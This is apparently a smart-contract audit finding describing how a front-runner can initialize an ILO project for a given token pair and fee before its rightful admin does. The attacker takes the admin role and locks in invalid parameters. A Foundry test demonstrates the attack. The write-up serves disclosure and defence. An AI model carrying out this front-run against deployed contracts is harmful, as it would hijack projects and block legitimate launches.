# Vulnerability details

## Impact

Each project has an unique pool address which has pool key determined by the set `(sale_token, raise_token, fee)`. In case there is malicious actor, who front-run to initialize a project with the same set `(sale_token, raise_token, fee)` and with invalid project parameters, there will be impacts:
- Project admin role is set to the malicious
- Project with invalid parameters could be initialized by the malicious
- A normal project admin can not re-initialize the project with expected parameters for the same univ3 pool

So far, the project can not be launched as expected

## Proof of Concept
Update the test `test/ILOManager.t.sol:ILOManagerTest#testInitProject()` as below:
```solidity
    function testInitProject() external {
        address malicious = vm.addr(111);
        vm.startPrank(malicious);
        address univ3Pool = iloManager.initProject(
            IILOManager.InitProjectParams({
                saleToken: mockProject().saleToken,
                raiseToken: mockProject().raiseToken,
                fee: 10000,
                initialPoolPriceX96: mockProject().initialPoolPriceX96 + 1,
                launchTime: 0 // invalid paramter
            })
        );

        // admin role
        IILOManager.Project memory proj = iloManager.project(univ3Pool);
        assertEq(proj.admin, malicious);

        vm.expectRevert(bytes("RE"));
        iloManager.initProject(
            IILOManager.InitProjectParams({
                saleToken: mockProject().saleToken,
                raiseToken: mockProject().raiseToken,
                fee: 10000,
                initialPoolPriceX96: mockProject().initialPoolPriceX96 + 1,
                launchTime: mockProject().launchTime
            })
        );
    }
```
